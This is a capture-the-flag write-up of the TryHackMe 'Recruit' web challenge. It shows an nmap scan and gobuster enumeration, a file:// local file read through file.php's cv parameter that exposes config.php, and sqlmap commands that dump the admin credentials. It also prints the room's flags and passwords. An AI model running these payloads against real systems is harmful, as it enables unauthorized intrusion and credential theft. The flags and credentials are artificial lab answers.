
A writeup for THM CTF *Recruit* from the Jr. Penetration Tester path.
Level: Medium

Description:
```
**Recruit** has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.

Can you gain an initial foothold, escalate your access, and ultimately log in as the **administrator?**
```

The challenge has two flag to capture, one from logging in as normal user, and the second one from logging in as admin.

First thing to do is a nmap scan with `nmap -A -v -T4 -p- 10.114.142.66`.
The results were:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7f:c0:85:f2:61:5d:ad:17:4d:a4:c8:e7:51:d2:93:1a (RSA)
|   256 c5:ce:3b:c9:a4:9d:9d:eb:8d:d0:90:8b:7c:20:7d:22 (ECDSA)
|_  256 07:17:ad:93:88:f5:fb:61:73:4c:81:be:d8:85:67:98 (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Recruit
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

After navigating to the webpage, I was welcomed with a login form.

I also started fuzzing for hidden files and directories with: `gobuster dir -u 'http://10.114.142.66' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js,.py -b 403-500`.
And I found:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api.php              (Status: 200) [Size: 4151]
/assets               (Status: 301) [Size: 315] [--> http://10.114.142.66/assets/]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 457] [--> index.php]
/file.php             (Status: 200) [Size: 20]
/footer.php           (Status: 200) [Size: 289]
/header.php           (Status: 200) [Size: 457]
/index.php            (Status: 200) [Size: 1417]
/javascript           (Status: 301) [Size: 319] [--> http://10.114.142.66/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/mail                 (Status: 301) [Size: 313] [--> http://10.114.142.66/mail/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.114.142.66/phpmyadmin/]
/sitemap.xml          (Status: 200) [Size: 1710]
Progress: 163752 / 163760 (100.00%)
===============================================================
Finished
===============================================================
```

I was interested in the `mail` directory so I enumerated further and I found `/mail/mail.log` file. And from there I found out that credential for `hr` user are stored in the `config.php` file.

I started looking into `.php` files that I enumerated.

- `api.php` doesn't have anything interesting in it.
- `config.php` I couldn't see it's content
- `dashboard.php` shows login form
- `file.php` shows *Missing cv parameter* on page
- `footer.php`, `header.php`, `index.php` and `logout.php` - useless

I dig deeper into `file.php` and it's *Missing cv parameter* error. So I tried:
`http://10.114.142.66/file.php?cv=http://10.114.142.66/config.php` and there was another error which said: *Only local files are allowed*. So, I am onto something here. I tried another trick: `http://10.114.142.66/file.php?cv=file://10.114.142.66/config.php`, I changed protocol from `http` to `file` and this time I got *Access denied*. I messed around with it a little bit, and finally I found working payload: `http://10.114.142.66/file.php?cv=file:///var/www/html/config.php`.

Credentials for `hr` user: `hrpassword123`
Let's log in!
First flag: **THM{LOGGED_IN_USER}**

Immediately after logging in I spotted a search functionality. I tested it with `test'` and I got SQL error. So I went atom bomb option with sqlmap. Command used `sqlmap -u http://10.114.142.66/dashboard.php?search=* --cookie="PHPSESSID=g0gsddlqehcdibn62ou69mk1eg" --dbs --batch`

And I enumerated databases:
```
available databases [6]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] recruit_db
[*] sys
```

Next I checked `mysql` database with command: `sqlmap -u http://10.114.142.66/dashboard.php?search=* --cookie="PHPSESSID=g0gsddlqehcdibn62ou69mk1eg" --dump mysql --batch`

And I found out admin credentials:
```
Table: users
[1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | admin@001admin | admin    |
+----+----------------+----------+
```

I went back to `http://10.114.142.66/` and used dumped creds.
The admin flag: **THM{LOGGED_IN_ADM1N1}**

